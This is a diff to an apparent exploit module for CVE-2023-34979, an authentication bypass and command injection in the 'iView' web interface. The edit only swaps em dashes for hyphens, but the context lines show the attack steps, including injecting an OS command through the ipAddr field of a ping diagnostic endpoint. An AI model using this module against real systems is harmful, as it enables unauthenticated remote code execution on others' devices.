@@ -6,7 +6,7 @@ CVE-2023-34979 is an authentication bypass vulnerability in the iView web
 interface that allows an unauthenticated attacker to access privileged endpoints
 and achieve Remote Code Execution.
 
-The vulnerability resides in the iView authentication mechanism — specific
+The vulnerability resides in the iView authentication mechanism - specific
 management endpoints do not properly validate session tokens or authentication
 state, allowing direct access to administrative functions.
 
@@ -179,7 +179,7 @@ class Exploit(Exploit):
                     f"  3. Inject OS command via POST to {_RCE_ENDPOINT} with "
                     f"ipAddr='{rce_payload}' (command injection in ping diagnostic).\n"
                     f"  4. Output includes result of command '{self.command}' executed as service user.\n"
-                    "CVSS 9.8 — no credentials required."
+                    "CVSS 9.8 - no credentials required."
                 ),
                 payload_hex="",
                 payload_human=(
@@ -235,5 +235,5 @@ class Exploit(Exploit):
             )
         else:
             print_warning(
-                f"[CVE-2023-34979] RCE attempt returned HTTP {status} — may need path adjustment."
+                f"[CVE-2023-34979] RCE attempt returned HTTP {status} - may need path adjustment."
             )
